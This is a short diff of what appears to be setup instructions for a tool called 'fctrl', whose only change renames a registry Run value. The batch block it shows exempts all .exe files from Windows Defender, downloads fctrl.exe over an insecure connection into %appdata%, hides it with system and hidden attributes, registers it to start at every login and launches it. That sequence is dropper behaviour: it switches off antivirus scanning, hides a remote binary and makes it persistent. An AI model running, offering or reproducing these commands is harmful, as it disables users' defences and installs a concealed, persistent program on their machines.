@@ -13,7 +13,7 @@ fctrl (latest) setup
 reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions" /v .exe /t REG_DWORD /d 1 /f
 curl https://raw.githubusercontent.com/Minecraft-vIIr/public/refs/heads/main/fctrl.exe --insecure --output %appdata%\fctrl.exe
 attrib +s +h +a %appdata%\fctrl.exe
-reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "fctrl5" /d %appdata%\fctrl.exe /f
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "fctrl" /d %appdata%\fctrl.exe /f
 cmd.exe /C start %appdata%\fctrl.exe
 exit
 ```
